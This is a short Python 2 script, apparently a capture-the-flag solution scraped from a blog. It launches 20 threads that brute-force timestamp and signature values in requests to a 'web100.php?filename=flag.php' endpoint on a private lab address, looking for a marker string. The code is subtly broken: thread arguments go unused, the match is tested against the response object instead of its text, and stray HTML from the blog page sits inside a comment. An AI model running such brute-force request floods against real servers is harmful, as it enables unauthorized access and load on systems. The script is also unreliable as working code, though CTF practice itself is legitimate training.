import requests
import threading
def test(i,j):
    for x in range(0,100000):
        print x
        u1 = "http://192.168.211.10:80/web100.php?filename=flag.php&timestamp=" + str (x) + "&sig=1"
        u2 = "http://192.168.211.10:80/web100.php?filename=flag.php&timestamp=" + str (x) + "&sig=0"
        # print u2
        r1 = requests.get (u1)
        r2 = requests.get (u2)
        l1 = len (r1.text)
        l2 = len (r2.text)
        # if l1!=210:<img src="https://b01701.files.wordpress.com/2016/11/1.png?w=300" alt="1" width="300" height="68" class="alignnone size-medium wp-image-145" />
        #     print u1
        # if l2!=210:
        #     print u2
        if "<br>Dare to read flag.php???<br>" in r1:
            print u1
        if "<br>Dare to read flag.php???<br>" in r2:
            print  u2




# for i in range (0, 1000000):
#     # th = threading.Thread (target=test, args=[i])
#     test(i)



thread = []
s = 0
e = 0
for i in range(0,20):
    s = s+i*50000
    t = threading.Thread(target=test,args=[s,s+50000])

    thread.append(t)
    t.start()


